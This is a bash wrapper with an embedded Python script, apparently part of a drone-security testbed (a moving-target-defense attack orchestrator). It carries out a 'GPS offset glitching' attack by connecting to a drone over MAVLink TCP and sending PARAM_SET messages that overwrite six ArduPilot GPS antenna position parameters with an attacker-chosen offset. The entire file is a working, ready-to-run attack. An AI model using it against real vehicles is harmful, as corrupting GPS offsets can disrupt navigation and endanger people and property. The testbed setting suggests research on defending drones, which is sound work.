#!/usr/bin/env bash
# Auto-generated from: GPS-Offset-Glitching.md
set -euo pipefail

# MTD_INTERFACE_START
# =======================================================================
# MTD 환경 변수를 통한 동적 타겟 획득
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입에 따라 TARGET_PORT 기본값 설정
# GPS Offset Glitching은 MAVLink 파라미터 설정을 이용하며, MAVLink TCP 포트 5760을 가정합니다.
case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
  DRONE_MAVLINK_TCP)
    TARGET_PORT="${TARGET_PORT:-5760}" # 기본 MAVLink TCP 포트
    ;;
  DRONE_MAVLINK)
    TARGET_PORT="${TARGET_PORT:-14550}" # 일반 MAVLink UDP 포트 (예비)
    ;;
  *)
    :
    ;;
esac

echo "[INFO] Attack target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
# MTD_INTERFACE_END

# 기준 경로 및 로깅 설정
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }; export -f log
fi

log "[ATTACK] id=gps-offset-glitching src=GPS-Offset-Glitching.md"
log "[BLOCK 1] type=python (Inline GPS Offset Glitching Attack)"

# MAVLink PARAM_SET 명령을 이용해 GPS 오프셋을 설정하는 Python 인라인 스크립트 실행
# 오케스트레이터가 인수로 "최대 오프셋 값" (예: 10.0)을 TARGET_IP:PORT 뒤에 추가 주입한다고 가정합니다.
# 원본 스크립트의 실행 예시: sudo python3 gps_offset_attack.py ${TARGET_IP}:5760 10
MAX_OFFSET_VALUE="${1:-10.0}" # 첫 번째 인수로 오프셋 값을 받거나 기본값 10.0 사용

python3 -u - "${TARGET_IP}:${TARGET_PORT}" "${MAX_OFFSET_VALUE}" <<'PY'
import os, sys
import time
from pymavlink import mavutil

# --- Argument Parsing from Shell ---
if len(sys.argv) < 3:
    # 인수가 부족할 경우 환경 변수와 기본값으로 대체 (오케스트레이터 통합 시)
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '5760')
    max_offset = float(os.environ.get('MAX_OFFSET_VALUE', '10.0')) # 환경 변수 또는 하드코딩된 기본값 사용
    print(f"[INFO] Using environment fallback: {target_ip}:{target_port} with offset {max_offset}")
else:
    # 쉘 스크립트에서 전달된 인수 사용 (IP:PORT, MAX_OFFSET_VALUE)
    target_ip, target_port_str = sys.argv[1].split(':')
    target_port = int(target_port_str)
    try:
        max_offset = float(sys.argv[2])
    except ValueError:
        print(f"[ERROR] Invalid offset value: {sys.argv[2]}", file=sys.stderr)
        sys.exit(1)
# -----------------------------------

def connect_drone(ip: str, port: int):
    """MAVLink TCP 연결을 시도하고 하트비트를 기다립니다."""
    connection_string = f'tcp:{ip}:{port}'
    try:
        master = mavutil.mavlink_connection(connection_string)
        master.wait_heartbeat()
        print(f"[INFO] Connected to the drone via {connection_string}.")
        return master
    except Exception as e:
        print(f"[ERROR] Failed to connect to drone: {e}", file=sys.stderr)
        sys.exit(1)

def set_param(master, param_id, param_value, param_type):
    """MAVLink PARAM_SET 메시지를 전송합니다."""
    # param_id는 16바이트로 패딩되어야 합니다.
    param_id_padded = param_id.encode('utf-8')[:16].ljust(16, b'\x00')
    master.mav.param_set_send(
        master.target_system,
        master.target_component,
        param_id_padded,
        param_value,
        param_type
    )
    print(f"[>] PARAM_SET sent: {param_id} = {param_value}")

def main(target_ip, target_port, max_offset):
    master = connect_drone(target_ip, target_port)
    
    # 공격 대상 GPS 오프셋 파라미터 리스트 (ArduPilot의 EKF3/GPS 관련 파라미터)
    gps_params = ['GPS_POS1_X', 'GPS_POS1_Y', 'GPS_POS1_Z', 
                  'GPS_POS2_X', 'GPS_POS2_Y', 'GPS_POS2_Z']
    
    print(f"[INFO] Starting GPS Position Offset Glitching with offset: {max_offset} meters.")
    
    for param in gps_params:
        # 오프셋 값을 설정 (float 타입인 REAL32 사용)
        set_param(master, param, max_offset, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        time.sleep(0.1) # 짧은 지연

    print("[INFO] All GPS offset parameters modified. Attack complete.")

if __name__ == "__main__":
    main(target_ip, target_port, max_offset)
PY

log "[BLOCK 2] type=control (Execution Complete)"
log "Parameter injection attack finished execution."